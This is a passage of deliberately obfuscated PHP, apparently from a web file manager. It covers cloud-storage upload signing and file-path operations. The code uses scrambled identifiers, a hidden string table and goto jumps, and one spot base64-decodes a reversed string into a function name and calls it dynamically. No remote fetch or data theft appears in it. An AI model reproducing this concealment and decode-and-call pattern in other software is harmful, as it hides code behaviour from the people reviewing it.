=> $this->bucket), array($a•“¥«‰¦´[1191] => $F¦ºé„›’), array($a•“¥«‰¦´[1193], $a•“¥«‰¦´[1194], $a•“¥«‰¦´[33]), array($a•“¥«‰¦´[1193], $a•“¥«‰¦´[1226], $a•“¥«‰¦´[33]), array($a•“¥«‰¦´[1193], $a•“¥«‰¦´[1227], $a•“¥«‰¦´[33]), array($a•“¥«‰¦´[1195] => $cñšä§í‡Õ), array($a•“¥«‰¦´[1228] => $e…Æƒßøô), array($a•“¥«‰¦´[1229] => $a™¹ç¬Øï¢), array($a•“¥«‰¦´[1230] => $a÷£×ãÅ„¬), array($a•“¥«‰¦´[1231] => $E©À“ï©¦º))); goto b·çÂ‚í½ß; cÔù˜’©Ù: $a•“¥«‰¦´ =& $_SERVER[¬ı§†‰ú˜¼]; $F¦ºé„›’ = $a•“¥«‰¦´[191]; $a™¹ç¬Øï¢ = $a•“¥«‰¦´[1222]; goto e§½áåÏ«·; e§½áåÏ«·: $eÉîˆØïå = $a•“¥«‰¦´[59]; $a÷£×ãÅ„¬ = gmdate($a•“¥«‰¦´[1223]); $eï†ŞêÑÀ¼ = gmdate($a•“¥«‰¦´[715]); goto d½íçï“ƒ; FˆÀ’Êø„: $EÉÊØŸ·¿ß = array($a•“¥«‰¦´[210] => $a•“¥«‰¦´[33], $a•“¥«‰¦´[1234] => $a•“¥«‰¦´[33], $a•“¥«‰¦´[1191] => $F¦ºé„›’, $a•“¥«‰¦´[1195] => $cñšä§í‡Õ, $a•“¥«‰¦´[1199] => $a¯Îï‰ƒù, $a•“¥«‰¦´[1235] => $e…Æƒßøô, $a•“¥«‰¦´[1236] => $a™¹ç¬Øï¢, $a•“¥«‰¦´[1237] => $a÷£×ãÅ„¬, $a•“¥«‰¦´[1238] => $E©À“ï©¦º, $a•“¥«‰¦´[1239] => $CìîæåÇã¡, $a•“¥«‰¦´[175] => $this->getHost()); return $EÉÊØŸ·¿ß; goto b°Í Äã¦‘; d½íçï“ƒ: $eÂ¥±œâàÀ = $a•“¥«‰¦´[1224]; $E©À“ï©¦º = $e¬Ò…²Í‹– . $a•“¥«‰¦´[33]; $cñšä§í‡Õ = $a•“¥«‰¦´[1187]; goto Eâî‡Ş¹¦™; b·çÂ‚í½ß: $a¯Îï‰ƒù = base64_encode(json_encode($b‘™ØáÇƒ‡)); $dŠ¹è”–ªŸ = hash_hmac($a•“¥«‰¦´[1232], $eï†ŞêÑÀ¼, $a•“¥«‰¦´[1233] . $this->secret, !0); $Aƒ‰ô–³Ü“ = hash_hmac($a•“¥«‰¦´[1232], $this->region, $dŠ¹è”–ªŸ, !0); goto BÅÚ¬‹šÀ; BÅÚ¬‹šÀ: $bŠ‘†Ú¡¬ = hash_hmac($a•“¥«‰¦´[1232], $eÉîˆØïå, $Aƒ‰ô–³Ü“, !0); $e·Ó—°˜’ = hash_hmac($a•“¥«‰¦´[1232], $eÂ¥±œâàÀ, $bŠ‘†Ú¡¬, !0); $CìîæåÇã¡ = hash_hmac($a•“¥«‰¦´[1232], $a¯Îï‰ƒù, $e·Ó—°˜’); goto FˆÀ’Êø„; b°Í Äã¦‘: } public function multiUploadFormData($dË˜Éˆò»É, $E¥ÜºìĞÚ = 3600) { $f¡ªˆ—º´œ =& $_SERVER[¬ı§†‰ú˜¼]; $f¥İõ »—ó = gmdate($f¡ªˆ—º´œ[1317]); $E¥Ë®Â¢¸ = array(); $F¹„÷…ï´Ö = $this->client->getUploadId($this->bucket, $dË˜Éˆò»É, $E¥Ë®Â¢¸); if (!$F¹„÷…ï´Ö) { return !1; } return array($f¡ªˆ—º´œ[220] => $F¹„÷…ï´Ö, $f¡ªˆ—º´œ[175] => $this->getHost() . $f¡ªˆ—º´œ[8] . $this->pathEncode($dË˜Éˆò»É), $f¡ªˆ—º´œ[221] => $f¥İõ »—ó, $f¡ªˆ—º´œ[93] => $dË˜Éˆò»É); } public function multiUploadAuthData($CÖ½¦ù¨ôÂ, $F³¬¦‚œÈÊ = array()) { goto AéäÇõ“’; AéäÇõ“’: $eğö‰İÜ =& $_SERVER[¬ı§†‰ú˜¼]; $D›šå¦ó¬ = isset($F³¬¦‚œÈÊ[$eğö‰İÜ[168]]) ? $F³¬¦‚œÈÊ[$eğö‰İÜ[168]] : $eğö‰İÜ[33]; $DÎØÁ‹ö” = $F³¬¦‚œÈÊ[$eğö‰İÜ[93]]; goto CÚøÜÄ¬ŒÃ; CÚøÜÄ¬ŒÃ: unset($F³¬¦‚œÈÊ[$eğö‰İÜ[93]]); if (isset($F³¬¦‚œÈÊ[$eğö‰İÜ[222]])) { return $this->listUploadParts($DÎØÁ‹ö”, $F³¬¦‚œÈÊ); } $f®Ø’Â¤©Õ = array(); goto B±ôáØóº; cˆ¨µµâ„õ: if (strpos($D›šå¦ó¬, $eğö‰İÜ[224]) === 0) { if (isset($f®Ø’Â¤©Õ[$eğö‰İÜ[1319]])) { $däšŠäÌÎô = $f®Ø’Â¤©Õ[$eğö‰İÜ[1319]]; } else { if (isset($fêÅ¦Ê‘åµ[$eğö‰İÜ[1319]])) { $däšŠäÌÎô = $fêÅ¦Ê‘åµ[$eğö‰İÜ[1319]]; } else { $däšŠäÌÎô = hash($eğö‰İÜ[1232], $eğö‰İÜ[33]); } } return array($eğö‰İÜ[231] => $fêÅ¦Ê‘åµ[$eğö‰İÜ[231]], $eğö‰İÜ[1319] => $däšŠäÌÎô, $eğö‰İÜ[221] => $fêÅ¦Ê‘åµ[$eğö‰İÜ[1322]]); } return $fêÅ¦Ê‘åµ[$eğö‰İÜ[231]]; goto aœ«»ÆÂ¶®; B±ôáØóº: if (isset($F³¬¦‚œÈÊ[$eğö‰İÜ[1318]])) { $f®Ø’Â¤©Õ[$eğö‰İÜ[1319]] = $F³¬¦‚œÈÊ[$eğö‰İÜ[1318]]; } $A¦ÎÙŞ–ª = explode($eğö‰İÜ[177], $this->getHost()); $fæš¾¸íÅ = array($eğö‰İÜ[1320] => $A¦ÎÙŞ–ª[1], $eğö‰İÜ[1321] => $eğö‰İÜ[33], $eğö‰İÜ[210] => $eğö‰İÜ[119], $eğö‰İÜ[1234] => $F³¬¦‚œÈÊ[$eğö‰İÜ[78]]); goto dõ”ÄŒº¼ó; dõ”ÄŒº¼ó: $b¯è½‘Öê = $eğö‰İÜ[225]; $eÁô“«éÙ¢ = $eğö‰İÜ[8] . $this->pathEncode($DÎØÁ‹ö”) . $D›šå¦ó¬; $fêÅ¦Ê‘åµ = $this->client->__getSignatureV4($f®Ø’Â¤©Õ, $fæš¾¸íÅ, $b¯è½‘Öê, $eÁô“«éÙ¢); goto cˆ¨µµâ„õ; aœ«»ÆÂ¶®: } public function listUploadParts($A†Äó•Ö Ê, $aŞî ×µ¨Ä = array()) { goto aôÎØÇ’Ÿ; fãìÖ‚ÛĞ: $cËèİ½à¨ .= $Dšë‘µìİŸ[1326]; $Cíªƒå°« = array(); $d§¶Òñ–ñ‰ = explode($Dšë‘µìİŸ[177], $this->getHost()); goto eïõ­±¿‰; eïõ­±¿‰: $CŞœ øğø® = array($Dšë‘µìİŸ[1320] => $d§¶Òñ–ñ‰[1], $Dšë‘µìİŸ[210] => $Dšë‘µìİŸ[119], $Dšë‘µìİŸ[1234] => strlen($cËèİ½à¨)); $Fß©Ù·ÖÌÕ = $Dšë‘µìİŸ[223]; $fˆ¸ç“ À® = $Dšë‘µìİŸ[8] . $this->pathEncode($A†Äó•Ö Ê) . $aŞî ×µ¨Ä[$Dšë‘µìİŸ[168]]; goto d‡¦ßäÄ„ó; EÕ‰µŠ×å·: if (!$b†ÆÉ„’) { return !1; } $cËèİ½à¨ = $Dšë‘µìİŸ[1323]; foreach ($b†ÆÉ„’ as $F·àåää××) { $cËèİ½à¨ .= $Dšë‘µìİŸ[1324] . "\x3c\x50\141\x72\164\x4e\165\x6d\142\145\x72\76{$F·àåää××[$Dšë‘µìİŸ[1279]]}\x3c\57\x50\141\x72\x74\116\165\x6d\142\145\162\76\xa" . "\x3c\105\124\141\x67\x3e{$F·àåää××[$Dšë‘µìİŸ[1280]]}\x3c\57\105\124\x61\147\x3e\xa" . $Dšë‘µìİŸ[1325]; } goto fãìÖ‚ÛĞ; d‡¦ßäÄ„ó: $Eó«ì÷‰ÖÂ = $this->client->__getSignatureV4($Cíªƒå°«, $CŞœ øğø®, $Fß©Ù·ÖÌÕ, $fˆ¸ç“ À®, $cËèİ½à¨); return array($Dšë‘µìİŸ[231] => $Eó«ì÷‰ÖÂ[$Dšë‘µìİŸ[231]], $Dšë‘µìİŸ[221] => $Eó«ì÷‰ÖÂ[$Dšë‘µìİŸ[1322]], $Dšë‘µìİŸ[233] => $b†ÆÉ„’, $Dšë‘µìİŸ[1319] => $Eó«ì÷‰ÖÂ[$Dšë‘µìİŸ[1319]]); goto D³ÛéõöÎÏ; aôÎØÇ’Ÿ: $Dšë‘µìİŸ =& $_SERVER[¬ı§†‰ú˜¼]; $Bİ‹Ò¥Û´¡ = str_replace($Dšë‘µìİŸ[232], $Dšë‘µìİŸ[33], $aŞî ×µ¨Ä[$Dšë‘µìİŸ[168]]); $b†ÆÉ„’ = $this->client->listParts($this->bucket, $A†Äó•Ö Ê, $Bİ‹Ò¥Û´¡); goto EÕ‰µŠ×å·; D³ÛéõöÎÏ: } public function link($c¹‚¦Æ‹™, $añĞí‰ÃÒ = array()) { return parent::link($c¹‚¦Æ‹™, $añĞí‰ÃÒ); } public function fileOut($Aù±ŞÆÉÂ, $CŸèğøì¥Ê = false, $bò¯ò×Êµì = false, $D×­ÓĞ¥¯ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¬ı§†‰ú˜¼][1327])) { return parent::fileOutServer($Aù±ŞÆÉÂ, $CŸèğøì¥Ê, $bò¯ò×Êµì, $D×­ÓĞ¥¯); } parent::fileOut($Aù±ŞÆÉÂ, $CŸèğøì¥Ê, $bò¯ò×Êµì, $D×­ÓĞ¥¯); } public function fileOutImage($bÔãÅ¡¾ò˜, $dØæ‡’ÜåÈ = 250) { if (strstr($this->endpoint, $_SERVER[¬ı§†‰ú˜¼][1327])) { return parent::fileOutImageServer($bÔãÅ¡¾ò˜, $dØæ‡’ÜåÈ); } parent::fileOutImage($bÔãÅ¡¾ò˜, $dØæ‡’ÜåÈ); } public function fileOutLink($cÇ¡ïŒ´Ğ) { $a†ßÏ’„µ =& $_SERVER[¬ı§†‰ú˜¼]; if (substr($cÇ¡ïŒ´Ğ, 0, 7) == $a†ßÏ’„µ[1202]) { $cÇ¡ïŒ´Ğ = $a†ßÏ’„µ[1203] . substr($cÇ¡ïŒ´Ğ, 7); } header($a†ßÏ’„µ[159] . $cÇ¡ïŒ´Ğ); die; } public function getHost() { $EÉƒäËµéÁ =& $_SERVER[¬ı§†‰ú˜¼]; $A±‚Äà”–é = str_rtrim(parent::getHost(), $EÉƒäËµéÁ[8] . $this->bucket); $A±‚Äà”–é = explode($EÉƒäËµéÁ[177], $A±‚Äà”–é); return $A±‚Äà”–é[0] . $EÉƒäËµéÁ[177] . $this->bucket . $EÉƒäËµéÁ[95] . $A±‚Äà”–é[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($CªµƒÖ‚„¢, $Dâ³•‡¿ªÛ = 0) { parent::__construct(); $this->source = $CªµƒÖ‚„¢; $this->sourceSize = $Dâ³•‡¿ªÛ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($FÌ´÷ÁèÅ» = false) { return $this->sourceSize; } public function getContent($eŒ á¤Å¸„ = false) { return $this->fileSubstr($eŒ á¤Å¸„, 0, $this->sourceSize); } public function fileSubstr($eî Ş½Úß = false, $BÙ™ÍÑİØ = 0, $FÛ¶Ä±¸µ¯ = 0) { if (!$FÛ¶Ä±¸µ¯) { $FÛ¶Ä±¸µ¯ = $this->sourceSize; } $e£×Ê¶Œä» = $this->sourceSize - $BÙ™ÍÑİØ; if ($FÛ¶Ä±¸µ¯ >= $e£×Ê¶Œä») { $FÛ¶Ä±¸µ¯ = $e£×Ê¶Œä»; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $BÙ™ÍÑİØ, $FÛ¶Ä±¸µ¯); } if ($this->sourceType == self::TYPE_FILE) { if ($FÛ¶Ä±¸µ¯ <= 0) { return $_SERVER[¬ı§†‰ú˜¼][33]; } $DöÕçñ ˜÷ = ftell($this->source); fseek_64($this->source, $DöÕçñ ˜÷ + $BÙ™ÍÑİØ); $d¥½»Œ„îó = @fread($this->source, $FÛ¶Ä±¸µ¯); fseek_64($this->source, $DöÕçñ ˜÷); return $d¥½»Œ„îó; } } public function hashMd5($DŒ°Á†‚ì‘ = false) { return md5($this->getContent()); } public static function hash($a¡ï¾Ê›¿Ù, $d£Ñ®¶¼Öš = 0) { $aĞ–øÔÜ« = new PathDriverStream($a¡ï¾Ê›¿Ù, $d£Ñ®¶¼Öš); return $aĞ–øÔÜ«->hashSimple($a¡ï¾Ê›¿Ù); } public static function md5($a·ö¸Ÿ™Ü, $cˆ»Ö‰Ñ = 0) { $c‰ÄÂĞ¶‰ = new PathDriverStream($a·ö¸Ÿ™Ü, $cˆ»Ö‰Ñ); return $c‰ÄÂĞ¶‰->hashMd5($a·ö¸Ÿ™Ü); } } goto b·Ğ±ğÕ¶; ağˆæ™ó: $BºÖóÁÁŞË = strrev(base64_decode($_SERVER[šé»][0])); function binCheckNeq($Döèç–Ï‡©, $AÉ¡”è è™) { return $Döèç–Ï‡© != $AÉ¡”è è™; } $_SERVER[$_SERVER[šé»][1]] = $BºÖóÁÁŞË($_SERVER[$_SERVER[šé»][2]]); goto aØ¶¸—¶ŠÛ; EÔØ£¸ ’Ò: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($fİ¬² ã) { $this->pathParse = $fİ¬² ã; $this->model = Model($_SERVER[¬ı§†‰ú˜¼][1204]); } public function getPath($aßÃÖâ‰¹Ş) { return trim($aßÃÖâ‰¹Ş, $_SERVER[¬ı§†‰ú˜¼][8]); } public function pathFather($aµĞœ‹‹¸) { $a§©ğ©¬Œ» = $this->parse($aµĞœ‹‹¸); $a§©ğ©¬Œ» = $this->infoSimple($aµĞœ‹‹¸); return $a§©ğ©¬Œ» ? $a§©ğ©¬Œ»[$_SERVER[¬ı§†‰ú˜¼][476]] : !1; } public function pathThis($fÊß±ÈÔæ) { $d˜ƒíš êÖ = $this->infoSimple($fÊß±ÈÔæ); return $d˜ƒíš êÖ ? $d˜ƒíš êÖ[$_SERVER[¬ı§†‰ú˜¼][28]] : !1; } public function getPathOuter($F‚ÕµÔ°¯) { if (!$F‚ÕµÔ°¯) { return $F‚ÕµÔ°¯; } $e‘²‡Í¸òÕ = $this->parse($F‚ÕµÔ°¯); return KodIO::make($e‘²‡Í¸òÕ[$_SERVER[¬ı§†‰ú˜¼][392]]); } public function copyFolderFromIO($BÍâÛòóæ‚, $BŸ…Ò„¯ğ‡, $FçÔğŸŒ¨â, $f©ŒŒƒ˜, $Fö—·­¥ïÖ) { $c¾ØÍéØä‘ = $this->model->copyFolderFromIO($BÍâÛòóæ‚, $BŸ…Ò„¯ğ‡, $FçÔğŸŒ¨â, $f©ŒŒƒ˜, $Fö—·­¥ïÖ); return KodIO::make($c¾ØÍéØä‘); } public function isParentOf($cš·ŸÊ„ŸÉ, $c¦“‘ªø“ğ) { return $this->model->isParentOf($cš·ŸÊ„ŸÉ, $c¦“‘ªø“ğ); } public function mkfile($eÙŒ‰ÊŒ³ì, $e’¼“âà‹¤ = '', $BâºßÁ‰Ø¢ = REPEAT_RENAME) { $F«’‹ ×… =& $_SERVER[¬ı§†‰ú˜¼]; $E•´†¦ = $this->parse($eÙŒ‰ÊŒ³ì); $eÙŒ‰ÊŒ³ì = $E•´†¦[$F«’‹ ×…[392]]; for ($B‹‹çˆ½°é = 0; $B‹‹çˆ½°é < count($E•´†¦[$F«’‹ ×…[1205]]); $B‹‹çˆ½°é++) { $aŒ¹•— İ = $E•´†¦[$F«’‹ ×…[1205]][$B‹‹çˆ½°é]; if ($B‹‹çˆ½°é == count($E•´†¦[$F«’‹ ×…[1205]]) - 1) { $eÙŒ‰ÊŒ³ì = $this->model->mkfile($eÙŒ‰ÊŒ³ì, $aŒ¹•— İ, $e’¼“âà‹¤, $BâºßÁ‰Ø¢); break; } $eÙŒ‰ÊŒ³ì = $this->model->mkdir($eÙŒ‰ÊŒ³ì, $aŒ¹•— İ, REPEAT_SKIP); } return $this->getPathOuter($eÙŒ‰ÊŒ³ì); } public function mkdir($F¶Œ¦Œ½ˆç, $eš¦µ‡©­á = REPEAT_SKIP) { $c¨¬­‹Í¤¶ =& $_SERVER[¬ı§†‰ú˜¼]; $A¤¹¡ñ® = $this->parse($F¶Œ¦Œ½ˆç); $F¶Œ¦Œ½ˆç = $A¤¹¡ñ®[$c¨¬­‹Í¤¶[392]]; for ($eŸÚ»Œê¬ª = 0; $eŸÚ»Œê¬ª < count($A¤¹¡ñ®[$c¨¬­‹Í¤¶[1205]]); $eŸÚ»Œê¬ª++) { $d£æİµ«ã = $A¤¹¡ñ®[$c¨¬­‹Í¤¶[1205]][$eŸÚ»Œê¬ª]; $F¶Œ¦Œ½ˆç = $this->model->mkdir($F¶Œ¦Œ½ˆç, $d£æİµ«ã, $eš¦µ‡©­á); } return $this->getPathOuter($F¶Œ¦Œ½ˆç); } public function copyFile($Dè²™à‰ó„, $C®ó®ÄóÁá, $CùåŒ‰¼• = REPEAT_REPLACE) { $b›Ã‘Ë‰´ =& $_SERVER[¬ı§†‰ú˜¼]; $AÅœÜ¾¦´¥ = $this->parse($C®ó®ÄóÁá); $cã¶Â–ïµã = $this->model->copy($Dè²™à‰ó„, $AÅœÜ¾¦´¥[$b›Ã‘Ë‰´[392]], $CùåŒ‰¼•, $AÅœÜ¾¦´¥[$b›Ã‘Ë‰´[76]]); return $cã¶Â–ïµã ? $this->getPathOuter($cã¶Â–ïµã) : !1; } public function moveFile($Eó­ºšŸË¢, $dœ¯“±‚ˆÈ, $EÊÄŒÉ‹ƒá = REPEAT_REPLACE) { $EÒÆ‚íÖ¢¾ =& $_SERVER[¬ı§†‰ú˜¼]; $c«²Å°˜Ù = $this->parse($dœ¯“±‚ˆÈ); $a‘ö¹İÄŒ = $this->model->move($Eó­ºšŸË¢, $c«²Å°˜Ù[$EÒÆ‚íÖ¢¾[392]], $EÊÄŒÉ‹ƒá, $c«²Å°˜Ù[$EÒÆ‚íÖ¢¾[76]]); return $a‘ö¹İÄŒ ? $this->getPathOuter($a‘ö¹İÄŒ) : !1; } public function copy($Eˆ÷ĞÈ‚æ, $a§‰ä¡ù¾ñ, $E‚êÒ¦¸Ş§ = REPEAT_REPLACE) { $aÏÏ‚í««ˆ = $this->parse($a§‰ä¡ù¾ñ); $bÏ¨¸¥Ÿõ = $this->model->copy($Eˆ÷ĞÈ‚æ, $aÏÏ‚í««ˆ[$_SERVER[¬ı§†‰ú˜¼][392]], $E‚êÒ¦¸Ş§); return $bÏ¨¸¥Ÿõ ? $this->getPathOuter($bÏ¨¸¥Ÿõ) : !1; } public function moveSameAllow() { } public function move($DîğÚ„‡§¤, $fË¡¥‰¯åÊ, $bÃ„…ˆ©Õ = REPEAT_REPLACE) { $E¡‚Å“ÚÒ¯ = $this->parse($fË¡¥‰¯åÊ); $fåšµÃ”©„ = $this->model->move($DîğÚ„‡§¤, $E¡‚Å“ÚÒ¯[$_SERVER[¬ı§†‰ú˜¼][392]], $bÃ„…ˆ©Õ); return $fåšµÃ”©„ ? $this->getPathOuter($fåšµÃ”©„) : !1; } public function remove($B‚óµÂ£ç, $EŸ°Üå©· = true) { return $this->model->remove($B‚óµÂ£ç, $EŸ°Üå©·); } public function rename($bîÅ··…é, $EœøˆÄš¹ö) { $D­Î·„Ø¢ì = $this->model->rename($bîÅ··…é, $EœøˆÄš¹ö); return $D­Î·„Ø¢ì ? $this->getPathOuter($bîÅ··…é) : $D­Î·„Ø¢ì; } public function size($B§ËÏ£ç) { $eî¢Í‚ãÑ = $this->infoSimple($B§ËÏ£ç); return $eî¢Í‚ãÑ ? $eî¢Í‚ãÑ[$_SERVER[¬ı§†‰ú˜¼][78]] : 0; } public function infoSimple($C‚ö‚Óò’ƒ) { return $this->model->sourceInfo($C‚ö‚Óò’ƒ); } public function info($Bõàâíßî) { return $this->infoParse($Bõàâíßî); } public function infoAuth($fğÉ‘®íãŠ) { return $this->infoParse($fğÉ‘®íãŠ, !1, !0); } public function infoWithChildren($fÇĞöÒíŞ) { return $this->infoParse($fÇĞöÒíŞ, !0); } protected function infoParse($Dåªøæ¼Ò´, $D ¡¯î„ = false, $dÍ˜Àùø‘Ÿ = false) { if (!$D ¡¯î„) { return $this->model->pathInfo($Dåªøæ¼Ò´, $dÍ˜Àùø‘Ÿ); } return $this->model->pathInfoMore($Dåªøæ¼Ò´); } public function infoFull($B¥æ£¦Ï‹) { $e±Í÷”âŞ =& $_SERVER[¬ı§†‰ú˜¼]; $B‰×‚ó©¹ = explode($e±Í÷”âŞ[8], $B¥æ£¦Ï‹); $BŞÆö¡²¯Ô = implode($e±Í÷”âŞ[8], array_splice($B‰×‚ó©¹, 1)); return $this->model->pathInfoByPath($B‰×‚ó©¹[0], $BŞÆö¡²¯Ô); } public function hashSimple($dñŒßø”¹) { $c‡ŒìÌÂŠ— =& $_SERVER[¬ı§†‰ú˜¼]; $CÄ°­ÇŠ‡ª = $this->infoWithChildren($dñŒßø”¹); return $CÄ°­ÇŠ‡ª[$c‡ŒìÌÂŠ—[164]][$c‡ŒìÌÂŠ—[171]]; } public function hashMd5($e¥¯Áñ“‹¢) { $eªÊŸí¼ÙÉ =& $_SERVER[¬ı§†‰ú˜¼]; $eß©ÉŠÃáƒ = $this->infoWithChildren($e¥¯Áñ“‹¢); return $eß©ÉŠÃáƒ[$eªÊŸí¼ÙÉ[164]][$eªÊŸí¼ÙÉ[170]]; } public function exist($a·â‰‰æ’) { $B¾ªÎÊ«Ÿ· =& $_SERVER[¬ı§†‰ú˜¼]; $BŠåŸ•äÙ‚ = $this->parse($a·â‰‰æ’); if (!$BŠåŸ•äÙ‚[$B¾ªÎÊ«Ÿ·[76]]) { return $this->isFile($a·â‰‰æ’) || $this->isFolder($a·â‰‰æ’); } $FÕ¬®à¼İ¨ = array($B¾ªÎÊ«Ÿ·[393] => $BŠåŸ•äÙ‚[$B¾ªÎÊ«Ÿ·[392]], $B¾ªÎÊ«Ÿ·[28] => $BŠåŸ•äÙ‚[$B¾ªÎÊ«Ÿ·[76]]); $a¿ßŸÃåƒ‹ = $this->model->where($FÕ¬®à¼İ¨)->find(); return $a¿ßŸÃåƒ‹ ? !0 : !1; } public function isFile($Bçİ¿èø) { $fÀ·åÔ³Ê =& $_SERVER[¬ı§†‰ú˜¼]; $EªóóĞ™« = $this->infoSimple($Bçİ¿èø); return $EªóóĞ™« && $EªóóĞ™«[$fÀ·åÔ³Ê[401]] == $fÀ·åÔ³Ê[87] ? !1 : !0; } public function isFolder($Eôª§¬ÆÛ) { $aõÍ¸çé =& $_SERVER[¬ı§†‰ú˜¼]; $cŒß«ŒŠù = $this->infoSimple($Eôª§¬ÆÛ); return $cŒß«ŒŠù && $cŒß«ŒŠù[$aõÍ¸çé[401]] == $aõÍ¸çé[87] ? !0 : !1; } public function listPath($BœÜ‹××•, $DÕ‘•ÆÕ = false) { $DÈßëöîåÑ =& $_SERVER[¬ı§†‰ú˜¼]; if ($BœÜ‹××• == $DÈßëöîåÑ[33]) { return !1; } $F™Ó„Ş„³ê = array($DÈßëöîåÑ[393] => $BœÜ‹××•); if ($DÕ‘•ÆÕ) { return $this->model->listSource($F™Ó„Ş„³ê, -1); } return $this->model->listSource($F™Ó„Ş„³ê); } public function has($d›çÙí¶, $dªÇ³õèØ = false, $a¬¿‰ìÛÏ = null) { $c’ÜŞ¼éÚ =& $_SERVER[¬ı§†‰ú˜¼]; $D°ŒÒ§“ó = $this->infoWithChildren($d›çÙí¶); if ($dªÇ³õèØ) { return array($c’ÜŞ¼éÚ[203] => $D°ŒÒ§“ó[$c’ÜŞ¼éÚ[203]], $c’ÜŞ¼éÚ[202] => $D°ŒÒ§“ó[$c’ÜŞ¼éÚ[202]]); } return $a¬¿‰ìÛÏ ? $D°ŒÒ§“ó[$c’ÜŞ¼éÚ[203]] : $D°ŒÒ§“ó[$c’ÜŞ¼éÚ[202]]; } public function listAll($d‡¾ÜìøÈ) { $c¹º¯ê…¾ = IO::info($this->pathParse[$_SERVER[¬ı§†‰ú˜¼][76]]); if (!$c¹º¯ê…¾) { return array(); } return $this->model->listAll($d‡¾ÜìøÈ); } public function getContent($cĞ‰øñ„) { return $this->model->getContent($cĞ‰øñ„); } public function setContent($dİéñïôÙ„, $E¥’…ò«±Ã = '') { return $this->model->setContent($dİéñïôÙ„, $E¥’…ò«±Ã); } public function fileSubstr($c¾«øùĞÌ, $D««íÁˆ‘Í, $DÜ±å´ÕËó) { return $this->model->fileSubstr($c¾«øùĞÌ, $D««íÁˆ‘Í, $DÜ±å´ÕËó); } public function download($b†ÕêŠôæŸ, $dùçÅ¸Å×† = '') { $fÖê†’Æá = get_path_father($dùçÅ¸Å×†); $fó¦Œ‹‰ÊÏ = get_path_this($dùçÅ¸Å×†); $f¤—Õ‡ = $this->model->fileInfoGet($b†ÕêŠôæŸ); $d†—²ãĞ¼º = IO::copy($f¤—Õ‡[$_SERVER[¬ı§†‰ú˜¼][76]], $fÖê†’Æá, !1, $fó¦Œ‹‰ÊÏ); return $d†—²ãĞ¼º; } public function setModifyTime($e•§…ßæêš, $DÑ¬ßÙ¨…Ö = '') { $E…•÷½¬øØ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$e•§…ßæêš) { return; } $this->model->where(array($E…•÷½¬øØ[408] => $e•§…ßæêš))->save(array($E…•÷½¬øØ[84] => $DÑ¬ßÙ¨…Ö)); } public function upload($DÈ¦äÜÌ¦Í, $Dóğ¸†ˆÊ‰, $E‰×…§ºŠ„ = false, $c×ƒ×Õï× = REPEAT_REPLACE) { $AÚËÛ Ğ±Ä =& $_SERVER[¬ı§†‰ú˜¼]; $aã÷ˆ „é« = $this->parse($DÈ¦äÜÌ¦Í); $eÕšÔ‘Éê¡ = $this->model->addFile($aã÷ˆ „é«[$AÚËÛ Ğ±Ä[392]], $Dóğ¸†ˆÊ‰, $aã÷ˆ „é«[$AÚËÛ Ğ±Ä[76]], $E‰×…§ºŠ„, $c×ƒ×Õï×); return $this->getPathOuter($eÕšÔ‘Éê¡); } public function uploadFileByID($aàŸò‡Èí, $B›„ó†×­º, $b¦’Ú³Ô·£) { $aõ”–¹ÍÖ =& $_SERVER[¬ı§†‰ú˜¼]; $fì°ñàÅ’Ú = $this->parse($aàŸò‡Èí); $DÑÃ…ƒ” ò = $this->model->addFileByFileID($fì°ñàÅ’Ú[$aõ”–¹ÍÖ[392]], $B›„ó†×­º, $fì°ñàÅ’Ú[$aõ”–¹ÍÖ[76]], $b¦’Ú³Ô·£); return $this->getPathOuter($DÑÃ…ƒ” ò); } public function addFileByRemote($D‘æ” ®¨©, $bÖ°Ó¼ÈÌˆ, $aÓŒ“×ĞÏ = array(), $eœ·¦Ì²¬ = '', $b˜Æ›ëŒ‹Æ) { $F»¦Şñ‘‚¹ =& $_SERVER[¬ı§†‰ú˜¼]; $C„»Øª­ÀÆ = $this->parse($D‘æ” ®¨©); $eœ·¦Ì²¬ = empty($eœ·¦Ì²¬) ? $C„»Øª­ÀÆ[$F»¦Şñ‘‚¹[76]] : $eœ·¦Ì²¬; $aç×Š·Ò˜Ş = $this->model->addFileByRemote($C„»Øª­ÀÆ[$F»¦Şñ‘‚¹[392]], $bÖ°Ó¼ÈÌˆ, $eœ·¦Ì²¬, $aÓŒ“×ĞÏ, $b˜Æ›ëŒ‹Æ); return $this->getPathOuter($aç×Š·Ò˜Ş); } public function uploadLink($CíèÒ†¨Û‰, $fÉŒ‚Ñ×ï = 0) { $c‘Ÿ°ËÚÀÄ =& $_SERVER[¬ı§†‰ú˜¼]; $AŠ²†İ´‘¢ = $this->parse($CíèÒ†¨Û‰); $fŒ†™É×øÃ = _get($GLOBALS[$c‘Ÿ°ËÚÀÄ[7]], $c‘Ÿ°ËÚÀÄ[1206]); $dŞ²¹¸°£ù = _get($GLOBALS[$c‘Ÿ°ËÚÀÄ[7]], $c‘Ÿ°ËÚÀÄ[1207]); $CíèÒ†¨Û‰ = Model($c‘Ÿ°ËÚÀÄ[570])->createFileName($AŠ²†İ´‘¢[$c‘Ÿ°ËÚÀÄ[76]], $fŒ†™É×øÃ, $dŞ²¹¸°£ù); return IO::uploadLink($CíèÒ†¨Û‰, $fÉŒ‚Ñ×ï); } public function fileNameAuto($CÎ¦ˆ¤ŸíÍ, $FˆÚŞ¨ÛºÑ, $D¿õÏ¸êø° = REPEAT_REPLACE, $DãäƒÇÖÎ· = false) { return $this->model->fileNameAuto($CÎ¦ˆ¤ŸíÍ, $FˆÚŞ¨ÛºÑ, $D¿õÏ¸êø°, $DãäƒÇÖÎ·); } public function fileNameExist($fŸó½«ƒ¯, $dËæëŸ‡Ä) { return $this->model->fileNameExist($fŸó½«ƒ¯, $dËæëŸ‡Ä); } protected function _fileOut($dÃ”òÁ’Áğ, $cöôÀ¢Ğ  = false, $Bâ¿ÀÇˆ¡õ = false, $E­ªÏùÂâ = '', $EİÀç°‹Ô˜ = false) { goto A¦ã¤—–À; A¦ã¤—–À: $aí‘ÎŒ• =& $_SERVER[¬ı§†‰ú˜¼]; $aÅ•©ë× = $this->model->sourceInfo($dÃ”òÁ’Áğ); if ($aÅ•©ë×[$aí‘ÎŒ•[401]] == 